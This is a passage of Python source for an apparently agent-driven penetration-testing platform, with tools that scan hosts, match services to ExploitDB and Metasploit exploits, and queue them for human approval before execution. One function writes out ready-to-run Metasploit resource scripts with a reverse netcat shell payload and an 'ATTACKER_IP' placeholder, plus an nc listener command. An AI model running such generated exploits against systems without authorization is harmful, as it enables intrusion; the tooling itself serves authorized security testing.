            timeout=20,
        )
        if r.status_code != 200:
            return json.dumps({"error": f"HTTP {r.status_code}", "vectors": []})
        return json.dumps(r.json(), indent=2)
    except Exception as e:
        return json.dumps({"error": str(e), "vectors": []})


def check_system_status() -> str:
    """
    Check the status of all scanning services and tools.

    This function verifies that all required services are accessible and healthy:
    - Nmap & Masscan Scanner
    - RAG API & Database
    - Web Scanner (Gobuster/ZAP)
    - Nuclei Scanner
    - Playwright Scanner
    - Scan Recommender

    Use this before starting a pentest to ensure all tools are available.

    Returns:
        JSON string with detailed status report including:
        - overall_status: "healthy", "degraded", or "unhealthy"
        - services: Status of each individual service
        - summary: Human-readable summary
        - issues: List of any problems detected
    """
    result = get_scan_tools().check_system_status()
    return json.dumps(result, indent=2)


# ===============================
# Exploit Matching and Execution Tools
# ===============================

def match_vuln_to_exploits(
    service: str,
    version: str = None,
    port: int = None,
    cve: str = None
) -> str:
    """
    Match a discovered service/version to known exploits.

    Searches both ExploitDB (via RAG) and Metasploit module cache
    to find potential exploits for the given service.

    Args:
        service: Service name (e.g., 'samba', 'apache', 'openssh')
        version: Service version (e.g., '3.0.20', '2.4.41')
        port: Port number (optional, for context)
        cve: Specific CVE to search for (e.g., 'CVE-2017-7494')

    Returns:
        JSON string with matched exploits from both sources:
        {
            "exploitdb": [...],
            "metasploit": [...],
            "total_matches": N
        }
    """
    from db_utils import search_msf_modules

    results = {
        "query": {
            "service": service,
            "version": version,
            "port": port,
            "cve": cve
        },
        "exploitdb": [],
        "metasploit": [],
        "total_matches": 0
    }

    # Build search query for ExploitDB RAG
    query_parts = [service]
    if version:
        query_parts.append(version)
    if cve:
        query_parts.append(cve)
    query_parts.append("exploit remote code execution")

    query = " ".join(query_parts)

    # Search ExploitDB via RAG
    try:
        edb_result = get_scan_tools().query_exploitdb(query, top_k=10)
        if "answer" in edb_result:
            results["exploitdb"] = {
                "answer": edb_result.get("answer", ""),
                "sources": edb_result.get("sources", [])
            }
    except Exception as e:
        results["exploitdb_error"] = str(e)

    # Search Metasploit modules
    try:
        msf_results = []

        # Search by CVE if provided
        if cve:
            msf_by_cve = search_msf_modules(cve=cve, module_type="exploit", limit=10)
            msf_results.extend(msf_by_cve)

        # Search by service name
        msf_by_service = search_msf_modules(query=service, module_type="exploit", limit=10)
        msf_results.extend(msf_by_service)

        # Deduplicate by module_path
        seen = set()
        unique_msf = []
        for mod in msf_results:
            if mod["module_path"] not in seen:
                seen.add(mod["module_path"])
                unique_msf.append({
                    "module_path": mod["module_path"],
                    "name": mod["name"],
                    "description": mod.get("description", "")[:200],
                    "rank": mod.get("rank"),
                    "platforms": mod.get("platforms", []),
                    "cve": mod.get("cve", []),
                    "required_options": mod.get("required_options", {})
                })

        results["metasploit"] = unique_msf
    except Exception as e:
        results["metasploit_error"] = str(e)

    results["total_matches"] = len(results.get("metasploit", [])) + len(results.get("exploitdb", {}).get("sources", []))

    return json.dumps(results, indent=2)


def search_msf_modules_tool(
    query: str = None,
    module_type: str = "exploit",
    cve: str = None,
    platform: str = None,
    limit: int = 20
) -> str:
    """
    Search the Metasploit module database.

    Args:
        query: Search term for name/description (e.g., 'samba', 'smb')
        module_type: Module type ('exploit', 'auxiliary', 'post')
        cve: CVE identifier to match (e.g., 'CVE-2017-7494')
        platform: Target platform ('linux', 'windows', 'unix')
        limit: Maximum number of results

    Returns:
        JSON string with matching Metasploit modules
    """
    from db_utils import search_msf_modules

    try:
        results = search_msf_modules(
            query=query,
            module_type=module_type,
            cve=cve,
            platform=platform,
            limit=limit
        )

        # Format results for readability
        formatted = []
        for mod in results:
            formatted.append({
                "module_path": mod["module_path"],
                "name": mod["name"],
                "rank": mod.get("rank"),
                "description": (mod.get("description") or "")[:300],
                "platforms": mod.get("platforms", []),
                "cve": mod.get("cve", []),
                "required_options": mod.get("required_options", {})
            })

        return json.dumps({"modules": formatted, "count": len(formatted)}, indent=2)

    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)


def customize_exploit(
    exploit_id: str,
    source: str,
    target_ip: str,
    target_port: int,
    lhost: str = None,
    lport: int = 4444
) -> str:
    """
    Customize an exploit with target-specific parameters.

    Generates a ready-to-run command or script for the specified exploit.

    Args:
        exploit_id: EDB-ID (e.g., '16320') or MSF module path (e.g., 'exploit/multi/samba/usermap_script')
        source: 'exploitdb' or 'metasploit'
        target_ip: Target IP address (RHOST)
        target_port: Target port number (RPORT)
        lhost: Attacker IP for reverse shells (defaults to detecting local IP)
        lport: Attacker port for reverse shells (default: 4444)

    Returns:
        JSON string with customized command and parameters
    """
    import socket

    # Try to detect local IP if not provided
    if not lhost:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            lhost = s.getsockname()[0]
            s.close()
        except Exception:
            lhost = "ATTACKER_IP"  # Placeholder

    parameters = {
        "RHOST": target_ip,
        "RPORT": target_port,
        "LHOST": lhost,
        "LPORT": lport
    }

    result = {
        "exploit_id": exploit_id,
        "source": source,
        "parameters": parameters,
        "customized_command": "",
        "warnings": []
    }

    if source == "metasploit":
        # Generate Metasploit resource script
        module_path = exploit_id if exploit_id.startswith("exploit/") else f"exploit/{exploit_id}"

        msf_commands = f"""use {module_path}
set RHOST {target_ip}
set RPORT {target_port}
set LHOST {lhost}
set LPORT {lport}
set PAYLOAD cmd/unix/reverse_netcat
exploit -j"""

        result["customized_command"] = msf_commands
        result["execution_method"] = "msfconsole -q -r <resource_file>"
        result["warnings"].append("Ensure Metasploit is running and accessible")

    elif source == "exploitdb":
        # For ExploitDB, provide guidance on running the script
        result["customized_command"] = f"""# ExploitDB {exploit_id}
# Check /opt/exploitdb/exploits/ for the exploit script
# Common execution patterns:

# Python exploit:
python /opt/exploitdb/exploits/*/[path_to_exploit].py {target_ip} {target_port}

# Ruby exploit:
ruby /opt/exploitdb/exploits/*/[path_to_exploit].rb {target_ip} {target_port}

# Compiled exploit (after compilation):
./exploit {target_ip} {target_port}

# Set up listener for reverse shell:
nc -lvnp {lport}"""

        result["execution_method"] = "manual"
        result["warnings"].append("Review the exploit source code before running")
        result["warnings"].append("Exploit path needs to be located in ExploitDB")

    return json.dumps(result, indent=2)


def queue_exploit_for_approval(
    exploit_id: str,
    source: str,
    exploit_title: str,
    customized_command: str,
    target_ip: str,
    target_port: int = None,
    target_service: str = None,
    target_version: str = None,
    exploit_type: str = "rce",
    parameters: dict = None,
    match_confidence: float = None,
    session_id: str = None,
    asset_id: str = None,
    port_id: str = None
) -> str:
    """
    Queue a customized exploit for human approval.

    This creates a pending exploit entry that must be approved by a human
    before it can be executed. This is a safety measure to ensure
    no exploits are run without explicit consent.

    Args:
        exploit_id: EDB-ID or MSF module path
        source: 'exploitdb' or 'metasploit'
        exploit_title: Human-readable exploit name
        customized_command: Ready-to-run command/script
        target_ip: Target IP address
        target_port: Target port number
        target_service: Service name (e.g., 'smb', 'ssh')
        target_version: Service version
        exploit_type: 'rce', 'auth_bypass', 'info_disclosure', 'other'
        parameters: Dict of exploit parameters
        match_confidence: 0.0-1.0 confidence score
        session_id: Agent session UUID (optional)

    Returns:
        JSON string with pending exploit ID and status
    """
    from db_utils import create_pending_exploit
    import uuid as uuid_lib

    try:
        session_uuid = uuid_lib.UUID(session_id) if session_id else None

        pending_id = create_pending_exploit(
            source=source,
            exploit_id=exploit_id,
            exploit_title=exploit_title,
            target_ip=target_ip,
            customized_command=customized_command,
            target_port=target_port,
            target_service=target_service,
            target_version=target_version,
            exploit_type=exploit_type,
            parameters=parameters or {},
            match_confidence=match_confidence,
            session_id=session_uuid,
            requested_by="Exploit Agent",
            asset_id=uuid_lib.UUID(asset_id) if asset_id else None,
            port_id=uuid_lib.UUID(port_id) if port_id else None
        )

        return json.dumps({
            "ok": True,
            "pending_exploit_id": str(pending_id),
            "status": "pending",
            "message": "Exploit queued for human approval. Use list_pending_exploits to view or approve_exploit to approve."
        }, indent=2)

    except Exception as e:
        return json.dumps({
            "ok": False,
            "error": str(e)
        }, indent=2)


def get_exploit_approval_status(pending_exploit_id: str) -> str:
    """
    Check the approval status of a pending exploit.

    Args:
        pending_exploit_id: UUID of the pending exploit

    Returns:
        JSON string with current status and details
    """
    from db_utils import get_pending_exploit
    import uuid as uuid_lib

    try:
        exploit_uuid = uuid_lib.UUID(pending_exploit_id)
        exploit = get_pending_exploit(exploit_uuid)

        if not exploit:
            return json.dumps({
                "ok": False,
                "error": "Exploit not found"
            }, indent=2)

        return json.dumps({
            "ok": True,
            "pending_exploit_id": str(exploit["id"]),
            "status": exploit["status"],
            "exploit_title": exploit["exploit_title"],
            "target": f"{exploit['target_ip']}:{exploit['target_port']}",
            "reviewed_by": exploit.get("reviewed_by"),
            "reviewed_at": str(exploit.get("reviewed_at")) if exploit.get("reviewed_at") else None,
            "rejection_reason": exploit.get("rejection_reason"),
            "can_execute": exploit["status"] == "approved"
        }, indent=2)

    except Exception as e:
        return json.dumps({
            "ok": False,
            "error": str(e)
        }, indent=2)


def list_pending_exploits_tool(status: str = None, limit: int = 20) -> str:
    """
    List exploits awaiting approval or review.

    Args:
        status: Filter by status ('pending', 'approved', 'rejected', 'executed', 'failed')
        limit: Maximum number of results

    Returns:
        JSON string with list of pending exploits
    """
    from db_utils import list_pending_exploits

    try:
        exploits = list_pending_exploits(status=status, limit=limit)

        formatted = []
        for exp in exploits:
            formatted.append({
                "id": str(exp["id"]),
                "status": exp["status"],
                "source": exp["source"],
                "exploit_id": exp["exploit_id"],
                "exploit_title": exp["exploit_title"],
                "target": f"{exp['target_ip']}:{exp['target_port']}",
                "target_service": exp.get("target_service"),
                "created_at": str(exp["created_at"]),
                "reviewed_by": exp.get("reviewed_by"),
                "reviewed_at": str(exp.get("reviewed_at")) if exp.get("reviewed_at") else None
            })

        return json.dumps({
            "ok": True,
            "exploits": formatted,
            "count": len(formatted)
        }, indent=2)

    except Exception as e:
        return json.dumps({
            "ok": False,
            "error": str(e)
        }, indent=2)


def execute_approved_exploit(pending_exploit_id: str) -> str:
    """
    Execute an approved exploit via the exploit-runner service.

    IMPORTANT: This function only works for exploits with status='approved'.
    Exploits must be approved by a human before execution.

    Args:
        pending_exploit_id: UUID of the approved pending exploit

    Returns:
        JSON string with execution result
    """
    from db_utils import get_pending_exploit
    import uuid as uuid_lib

    exploit_runner_url = os.environ.get("EXPLOIT_RUNNER_URL", "https://exploit-runner:8017")

    try:
        exploit_uuid = uuid_lib.UUID(pending_exploit_id)
        exploit = get_pending_exploit(exploit_uuid)

        if not exploit:
            return json.dumps({
                "ok": False,
                "error": "Exploit not found"
            }, indent=2)

        if exploit["status"] != "approved":
            return json.dumps({
                "ok": False,
                "error": f"Exploit is not approved. Current status: {exploit['status']}",
                "hint": "Use approve_exploit to approve this exploit first"
            }, indent=2)

        # Call the exploit-runner service based on exploit source
        try:
            if exploit["source"] == "metasploit":
                # Parse the customized command to extract module info
                # Expected format: "use <module>; set RHOSTS <ip>; set RPORT <port>; ..."
                params = exploit.get("parameters", {})

                # Call the MSF execution endpoint
                response = httpx.post(
                    f"{exploit_runner_url}/execute/msf",
                    json={
                        "module_type": params.get("module_type", "exploit"),
                        "module_name": params.get("module_path", exploit["exploit_id"]),
                        "options": {
                            "RHOSTS": str(exploit["target_ip"]),
                            "RPORT": exploit.get("target_port", 0),
                            "LHOST": params.get("lhost", ""),
                            "LPORT": params.get("lport", 4444),
                            **{k: v for k, v in params.items() if k not in ["module_type", "module_path", "lhost", "lport"]}
                        },
                        "pending_exploit_id": str(exploit_uuid)
                    },
                    timeout=300.0
                )

                if response.status_code != 200:
                    return json.dumps({
                        "ok": False,
                        "error": f"Exploit runner returned HTTP {response.status_code}",
                        "detail": response.text[:500]
                    }, indent=2)

                result = response.json()

                return json.dumps({
                    "ok": True,
                    "success": result.get("success", False),
                    "output": result.get("output", ""),
                    "session_type": result.get("session_type"),
                    "session_id": result.get("session_id"),
                    "error": result.get("error")
                }, indent=2)

            elif exploit["source"] == "exploitdb":
                # Call the script execution endpoint
                params = exploit.get("parameters", {})

                response = httpx.post(
                    f"{exploit_runner_url}/execute/script",
                    json={
                        "edb_id": exploit["exploit_id"],
                        "target_ip": str(exploit["target_ip"]),
                        "target_port": exploit.get("target_port", 0),
                        "lhost": params.get("lhost"),
                        "lport": params.get("lport", 4444),
                        "extra_args": {k: v for k, v in params.items() if k not in ["lhost", "lport"]},
                        "pending_exploit_id": str(exploit_uuid)
                    },
                    timeout=300.0
                )

                if response.status_code != 200:
                    return json.dumps({
                        "ok": False,
                        "error": f"Exploit runner returned HTTP {response.status_code}",
                        "detail": response.text[:500]
                    }, indent=2)

                result = response.json()

                return json.dumps({
                    "ok": True,
                    "success": result.get("success", False),
                    "output": result.get("output", ""),
                    "error": result.get("error")
                }, indent=2)

            else:
                return json.dumps({
                    "ok": False,
                    "error": f"Unknown exploit source: {exploit['source']}"
                }, indent=2)

        except httpx.ConnectError as e:
            return json.dumps({
                "ok": False,
                "error": "Cannot connect to exploit-runner service",
                "detail": str(e),
                "hint": "Ensure the exploit-runner container is running"
            }, indent=2)
        except httpx.TimeoutException as e:
            return json.dumps({
                "ok": False,
                "error": "Exploit execution timed out",
                "detail": str(e)
            }, indent=2)

    except Exception as e:
        return json.dumps({
            "ok": False,
            "error": str(e)
        }, indent=2)


# ===============================
# Job Status Polling Tools
# ===============================

def get_nmap_job_status(job_id: str) -> str:
    """
    Get the status of an Nmap/Masscan scan job.

    Use this to check if a scan has completed before proceeding.
    The Scanner agent should call this after starting a scan to monitor progress.

    Args:
        job_id: The job UUID returned from start_nmap_scan or start_masscan

    Returns:
        JSON string with job status:
        {
            "job_id": "...",
            "status": "queued" | "running" | "completed" | "failed",
            "progress": {"stage": "...", "details": "..."},
            "result": {...} (if completed),
            "error": "..." (if failed),
            "created_at": "...",
            "started_at": "...",
            "completed_at": "..."
        }
    """
    tools = get_scan_tools()
    url = f"{tools.nmap_url}/jobs/{job_id}"

    result = tools._make_request(
        method="GET",
        url=url,
        operation=f"Get nmap job status ({job_id[:8]}...)"
    )
    return json.dumps(result, indent=2)


def get_web_scan_job_status(job_id: str) -> str:
    """
    Get the status of a web scan job (Gobuster + ZAP).

    Args:
        job_id: The job UUID returned from start_web_scan

    Returns:
        JSON string with job status including progress and results
    """
    tools = get_scan_tools()
    url = f"{tools.web_scanner_url}/jobs/{job_id}"

    result = tools._make_request(
        method="GET",
        url=url,
        operation=f"Get web scan job status ({job_id[:8]}...)"
    )
    return json.dumps(result, indent=2)


def get_nuclei_job_status(job_id: str) -> str:
    """
    Get the status of a Nuclei vulnerability scan job.

    Args:
        job_id: The job UUID returned from start_nuclei_scan

    Returns:
        JSON string with job status including progress and vulnerability findings
    """
    tools = get_scan_tools()
    url = f"{tools.nuclei_url}/jobs/{job_id}"

    result = tools._make_request(
        method="GET",
        url=url,
        operation=f"Get nuclei job status ({job_id[:8]}...)"
    )
    return json.dumps(result, indent=2)


def get_playwright_job_status(scan_id: str) -> str:
    """
    Get the status of a Playwright browser security scan.

    Args:
        scan_id: The scan UUID returned from start_playwright_scan

    Returns:
        JSON string with scan status and findings
    """
    tools = get_scan_tools()

    # Get scan status
    status_result = tools.get_playwright_scan_status(scan_id)

    # Try to also get findings
    try:
        findings_result = tools.get_playwright_findings(scan_id)
        if "findings" in findings_result:
            status_result["findings"] = findings_result["findings"]
            status_result["findings_count"] = len(findings_result["findings"])
    except Exception:
        pass

    return json.dumps(status_result, indent=2)


def _scan_type_to_job_type(scan_type: str) -> str:
    """Map scan tracker type names to wait_for_job_completion job_type names."""
    return {
        "full_scan": "nmap",
        "deep_port_scan": "nmap",
        "smb_vuln": "nmap",
        "credential_check": "nmap",
        "masscan": "nmap",
        "nmap": "nmap",
        "udp": "nmap",
        "web_scan": "web",
        "nuclei": "nuclei",
        "playwright": "playwright",
        # PD tools go through pd-runner but we don't have a wait type for them
        "httpx": "nmap",
        "naabu": "nmap",
        "katana": "nmap",
        "brutus": "nmap",
        # OSINT runner scan types
        "passive-recon": "osint",
        "recon-pipeline": "osint",
        "subfinder": "osint",
        "dnsx": "osint",
    }.get(scan_type, "nmap")


def _enrich_with_follow_ups(result: dict, job_id: str) -> dict:
    """Add follow-up scan recommendations to a completed job result based on discovered ports."""
    scan_result = result.get("result") or result
    ports = set(scan_result.get("ports", []))
    targets_list = scan_result.get("targets", [])
    target_ip = targets_list[0] if targets_list else "TARGET"

    # Also query database for all known open ports on this target
    db_guidance: List[Dict] = []
    if target_ip != "TARGET":
        try:
            db_result = json.loads(query_open_ports(target=target_ip, limit=200))
            for item in db_result.get("items", []):
                ports.add(item.get("port", 0))
            # query_open_ports already resolved operator rules for these services.
            # Carry them through: recommended_follow_up_scans is the field the
            # agent is told to read and act on, and until now it was built purely
            # from hardcoded port lists, so ingested walkthrough knowledge had no
            # influence on what the agent actually ran next.
            db_guidance = db_result.get("operator_guidance") or []
            if len(ports) > len(scan_result.get("ports", [])):
                logger.info(f"[{job_id[:8]}] Enriched ports from DB: {len(scan_result.get('ports',[]))} scan → {len(ports)} total")
        except Exception as e:
            logger.warning(f"[{job_id[:8]}] Failed to query DB ports: {e}")

    if ports:
        follow_ups = []
        parallel_scans = []
        http_ports = sorted([p for p in ports if p in (80, 443, 8080, 8180, 8443, 8009, 8888, 3000, 9090)])
        smb_ports = sorted([p for p in ports if p in (139, 445)])
        non_http_ports = sorted([p for p in ports if p not in (80, 443, 8080, 8180, 8443, 8009, 8888, 3000, 9090)])
        auth_services = []
        if 22 in ports: auth_services.append("ssh")
        if 21 in ports or 2121 in ports: auth_services.append("ftp")
        if 3306 in ports: auth_services.append("mysql")
        if 5432 in ports: auth_services.append("postgres")
        if 5900 in ports: auth_services.append("vnc")
        if 23 in ports: auth_services.append("telnet")

        # PARALLEL GROUP 1: Start these simultaneously — don't wait for each other
        # Web pipeline (slow — includes ZAP)
        if http_ports:
            parallel_scans.append(f"start_pipeline_scan(target_url='http://{target_ip}') — web pipeline (gobuster, nikto, playwright, ZAP, nuclei)")
        # Nuclei vuln scan on ALL ports (runs fast, don't wait for web pipeline)
        parallel_scans.append(f"start_nuclei_scan(targets='http://{target_ip}', severity='critical,high,medium') — vulnerability scan on all services")
        # SMB scan (fast)
        if smb_ports:
            parallel_scans.append(f"start_smb_vuln_scan(target='{target_ip}') — SMB vulnerability check")

        if parallel_scans:
            follow_ups.append(
                "PARALLEL SCANS — start ALL of these NOW without waiting between them:\n  " +
                "\n  ".join(f"• {s}" for s in parallel_scans)
            )

        # SEQUENTIAL: After parallel scans complete, run these in order
        if auth_services:
            follow_ups.append(f"AFTER parallel scans complete: start_credential_check(target='{target_ip}', services='{','.join(auth_services)}') — test default/weak creds on {auth_services}")
        # Deep port discovery — run after vuln scans to find services on high ports
        has_high_ports = any(p > 1000 for p in ports if p not in (8080, 8443))
        if not has_high_ports:
            follow_ups.append(f"AFTER vuln scans + cred checks: review the phase-2 full-range (1-65535) masscan results from start_full_scan, then run nuclei on any newly discovered services")

        # Operator guidance goes FIRST: the groups above are generic defaults
        # derived from port numbers alone, while these rules were authored (often
        # ingested from a walkthrough) against these specific services.
        if db_guidance:
            lines = [
                "OPERATOR GUIDANCE — authored for the services found on this host. "
                "Apply these BEFORE the generic groups below; where they conflict, "
                "these win."
            ]
            for g in db_guidance:
                body = " ".join(
                    ln.strip().lstrip("- ")
                    for ln in (g.get("guidance") or "").splitlines()
                    if ln.strip().startswith("-")
                )
                if body:
                    lines.append(f"  • {g.get('service')}:{g.get('port')} — {body}")
            if len(lines) > 1:
                follow_ups.insert(0, "\n".join(lines))
                logger.info("[%s] Added operator guidance for %d service(s) to follow-ups",
                            job_id[:8], len(db_guidance))

        if follow_ups:
            result["recommended_follow_up_scans"] = follow_ups
            result["IMPORTANT"] = (
                "CRITICAL: Start the PARALLEL SCANS group ALL AT ONCE — call each tool immediately "
                "without waiting for the previous one to complete. The web pipeline (ZAP) is slow, "
                "so run nuclei and SMB scans in parallel to save time. "
                "Only wait for ALL parallel scans to finish before moving to sequential scans."
            )

    return result


def _check_job_status(tools, url: str, normalized_type: str, job_id: str) -> dict:
    """Make a single GET request to check job status."""
    return tools._make_request(
        method="GET",
        url=url,
        operation=f"Check {normalized_type} job ({job_id[:8]}...)"
    )


def wait_for_job_completion(
    job_id: str = None,
    job_type: str = "nmap",
    timeout_seconds: int = 0,
    poll_interval: int = 15
) -> str:
    """
    Wait for a scan job to complete using webhook-driven events.
    Falls back to a final poll if the webhook system is unavailable.
    Waits indefinitely by default (timeout_seconds=0 means no limit).

    IMPORTANT: The job_id MUST be the UUID returned by the scan start tool
    (e.g. start_full_scan). It is NOT the session ID. If you don't have
    the job_id, call get_session_scan_status() instead — it needs no parameters.

    Args:
        job_id: The job UUID from the scan start response (NOT the session ID)
        job_type: Type of job: "nmap", "masscan", "full_scan", "web", "nuclei", "playwright"
        timeout_seconds: Maximum time to wait (0 = unlimited, the default). Do NOT set a shorter timeout.
        poll_interval: Seconds between status checks (default: 15, used only as heartbeat interval)

    Returns:
        JSON string with final job status or timeout error
    """
    from autogen_service import register_job_wait, get_job_event_result, cleanup_job_wait

    tools = get_scan_tools()

    # Auto-resolve: if no job_id, or if it's not a valid UUID (hallucinated placeholder),
    # try to find the most recent running scan from the session tracker
    import re as _re
    _uuid_pattern = _re.compile(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', _re.IGNORECASE)
    resolved_from_session = False

    def _try_resolve_from_tracker():
        running_scans = scan_tracker.get_running_scans()
        if running_scans:
            scan = running_scans[0]
            return scan.get("job_id"), _scan_type_to_job_type(scan.get("type", "nmap"))
        return None, None

    if not job_id or not _uuid_pattern.match(str(job_id).strip()):
        if job_id:
            logger.warning(f"[wait] Invalid job_id '{job_id[:30]}' — not a UUID, trying session tracker")
        resolved_id, resolved_type = _try_resolve_from_tracker()
        if resolved_id:
            job_id = resolved_id
            job_type = resolved_type
            resolved_from_session = True
            logger.info(f"[wait] Auto-resolved job_id={job_id[:8]} (type={job_type}) from session tracker")
        else:
            return json.dumps({
                "error": "No valid job_id provided and no running scans found in this session.",
                "hint": "Call get_session_scan_status() to check all scans, or provide the exact job_id UUID from the scan start response."
            }, indent=2)

    # Map job_type aliases (full_scan → nmap, smb_vuln → nmap, etc.)
    normalized_type = _scan_type_to_job_type(job_type)

    def _build_url(ntype, jid):
        return {
            "nmap": f"{tools.nmap_url}/jobs/{jid}",
            "masscan": f"{tools.nmap_url}/jobs/{jid}",
            "web": f"{tools.web_scanner_url}/jobs/{jid}",
            "nuclei": f"{tools.nuclei_url}/jobs/{jid}",
            "playwright": f"{tools.playwright_url}/scan/{jid}",
            "osint": f"{tools.osint_runner_url}/jobs/{jid}",
        }.get(ntype)

    url = _build_url(normalized_type, job_id)
    if not url:
        return json.dumps({
            "error": f"Unknown job type: {job_type}",
            "valid_types": ["nmap", "masscan", "web", "nuclei", "playwright", "osint"]
        }, indent=2)

    start_time = time.time()

    # --- Step 1: Register webhook event for this job ---
    event = register_job_wait(job_id)
    unlimited = timeout_seconds <= 0
    logger.info(f"[{job_id[:8]}] Registered webhook wait (timeout={'unlimited' if unlimited else f'{timeout_seconds}s'})")

    try:
        # --- Step 2: Quick initial check (job may already be done) ---
        result = _check_job_status(tools, url, normalized_type, job_id)

        # Handle 404/400 with auto-resolve from session tracker
        if result.get("error") and result.get("status_code") in (400, 404) and not resolved_from_session:
            logger.warning(f"[wait] job_id={job_id[:8]} returned 404, trying session tracker lookup")
            running_scans = scan_tracker.get_running_scans()
            if running_scans:
                scan = running_scans[0]
                old_job_id = job_id
                job_id = scan.get("job_id")
                normalized_type = _scan_type_to_job_type(scan.get("type", "nmap"))
                url = _build_url(normalized_type, job_id)
                resolved_from_session = True
                logger.info(f"[wait] Re-resolved to job_id={job_id[:8]} (type={normalized_type})")
                # Re-register event for the correct job_id
                cleanup_job_wait(old_job_id)
                event = register_job_wait(job_id)
                if url:
                    result = _check_job_status(tools, url, normalized_type, job_id)
                else:
                    return json.dumps(result, indent=2)
            else:
                return json.dumps(result, indent=2)

        if result.get("error"):
            return json.dumps(result, indent=2)

        status = result.get("status", "unknown")

        # Already completed?
        if status in ["completed", "done", "finished"]:
            result["wait_result"] = "completed"
            result["elapsed_seconds"] = round(time.time() - start_time, 1)
            logger.info(f"[{job_id[:8]}] Job already completed on initial check")
            return json.dumps(_enrich_with_follow_ups(result, job_id), indent=2)

        # Already failed?
        if status in ["failed", "error"]:
            result["wait_result"] = "failed"
            result["elapsed_seconds"] = round(time.time() - start_time, 1)
            logger.warning(f"[{job_id[:8]}] Job already failed on initial check")
            return json.dumps(result, indent=2)

        # --- Step 3: Wait for webhook event with periodic heartbeats + poll fallback ---
        # Cap "unlimited" waits at 30 minutes to prevent thread hangs
        max_wait = timeout_seconds if not unlimited else 1800
        logger.info(f"[{job_id[:8]}] Job running (status={status}), waiting (max {max_wait}s)...")

        heartbeat_interval = 60  # seconds
        poll_interval_secs = 60  # poll the job status every 60s as a fallback
        last_poll_time = time.time()

        while True:
            elapsed = time.time() - start_time
            if elapsed >= max_wait:
                break

            remaining = max_wait - elapsed
            wait_chunk = min(heartbeat_interval, remaining)
            triggered = event.wait(timeout=wait_chunk)

            if triggered:
                # --- Step 4: Webhook fired — fetch full result ---
                logger.info(f"[{job_id[:8]}] Webhook event received, fetching final result...")
                result = _check_job_status(tools, url, normalized_type, job_id)

                if result.get("error"):
                    webhook_payload = get_job_event_result(job_id)
                    if webhook_payload:
                        result["webhook_data"] = webhook_payload.get("data", {})
                    return json.dumps(result, indent=2)

                final_status = result.get("status", "unknown")
                result["elapsed_seconds"] = round(time.time() - start_time, 1)

                if final_status in ["completed", "done", "finished"]:
                    result["wait_result"] = "completed"
                    logger.info(f"[{job_id[:8]}] Job completed after {result['elapsed_seconds']}s (webhook-driven)")
                    return json.dumps(_enrich_with_follow_ups(result, job_id), indent=2)
                elif final_status in ["failed", "error"]:
                    result["wait_result"] = "failed"
                    logger.warning(f"[{job_id[:8]}] Job failed after {result['elapsed_seconds']}s (webhook-driven)")
                    return json.dumps(result, indent=2)
                else:
                    logger.warning(f"[{job_id[:8]}] Webhook fired but status={final_status}, continuing wait")
                    event.clear()

            # Poll-based fallback: check job status periodically in case webhook was missed
            if time.time() - last_poll_time >= poll_interval_secs:
                last_poll_time = time.time()
                poll_result = _check_job_status(tools, url, normalized_type, job_id)
                if not poll_result.get("error"):
                    poll_status = poll_result.get("status", "unknown")
                    if poll_status in ["completed", "done", "finished"]:
                        poll_result["wait_result"] = "completed"
                        poll_result["elapsed_seconds"] = round(time.time() - start_time, 1)
                        logger.info(f"[{job_id[:8]}] Job completed after {poll_result['elapsed_seconds']}s (poll fallback)")
                        return json.dumps(_enrich_with_follow_ups(poll_result, job_id), indent=2)
                    elif poll_status in ["failed", "error"]:
                        poll_result["wait_result"] = "failed"
                        poll_result["elapsed_seconds"] = round(time.time() - start_time, 1)
                        logger.warning(f"[{job_id[:8]}] Job failed (poll fallback)")
                        return json.dumps(poll_result, indent=2)

            # Send heartbeat so watchdog knows we're still active
            scan_tracker.send_heartbeat()

        # --- Step 5: Timeout — do one final poll (job may have completed) ---
        logger.warning(f"[{job_id[:8]}] Webhook wait timed out after {timeout_seconds}s, doing final poll")
        result = _check_job_status(tools, url, normalized_type, job_id)

        if not result.get("error"):
            final_status = result.get("status", "unknown")
            if final_status in ["completed", "done", "finished"]:
                result["wait_result"] = "completed"
                result["elapsed_seconds"] = round(time.time() - start_time, 1)
                logger.info(f"[{job_id[:8]}] Job completed (found on final poll after timeout)")
                return json.dumps(_enrich_with_follow_ups(result, job_id), indent=2)
            if final_status in ["failed", "error"]:
                result["wait_result"] = "failed"
                result["elapsed_seconds"] = round(time.time() - start_time, 1)
                return json.dumps(result, indent=2)

        timeout_result = {
            "error": "Timeout waiting for job completion",
            "job_id": job_id,
            "job_type": job_type,
            "timeout_seconds": timeout_seconds,
            "elapsed_seconds": round(time.time() - start_time, 1),
            "last_status": result if not result.get("error") else None,
            "hint": "Job may still be running. Use get_*_job_status to check later."
        }
        logger.warning(f"[{job_id[:8]}] Timeout after {timeout_seconds}s")
        return json.dumps(timeout_result, indent=2)

    finally:
        # --- Step 6: Cleanup ---
        cleanup_job_wait(job_id)


def get_all_active_jobs() -> str:
    """
    Get status of all active scan jobs across all scanners.

    Useful for getting an overview of what's currently running.

    Returns:
        JSON string with active jobs from all scanner services
    """
    tools = get_scan_tools()
    results = {
        "nmap_jobs": [],
        "web_jobs": [],
        "nuclei_jobs": [],
        "errors": []
    }

    # Try to get jobs from nmap scanner
    try:
        resp = tools.client.get(f"{tools.nmap_url}/jobs", timeout=5.0)
        if resp.status_code == 200:
            results["nmap_jobs"] = resp.json().get("jobs", [])
    except Exception as e:
        results["errors"].append(f"nmap: {str(e)}")

    # Try to get jobs from web scanner
    try:
        resp = tools.client.get(f"{tools.web_scanner_url}/jobs", timeout=5.0)
        if resp.status_code == 200:
            results["web_jobs"] = resp.json().get("jobs", [])
    except Exception as e:
        results["errors"].append(f"web: {str(e)}")

    # Try to get jobs from nuclei
    try:
        resp = tools.client.get(f"{tools.nuclei_url}/jobs", timeout=5.0)
        if resp.status_code == 200:
            results["nuclei_jobs"] = resp.json().get("jobs", [])
    except Exception as e:
        results["errors"].append(f"nuclei: {str(e)}")

    # Summary
    total_active = (
        len([j for j in results["nmap_jobs"] if j.get("status") == "running"]) +
        len([j for j in results["web_jobs"] if j.get("status") == "running"]) +
        len([j for j in results["nuclei_jobs"] if j.get("status") == "running"])
    )
    results["summary"] = {
        "total_active_jobs": total_active,
        "nmap_count": len(results["nmap_jobs"]),
        "web_count": len(results["web_jobs"]),
        "nuclei_count": len(results["nuclei_jobs"])
    }

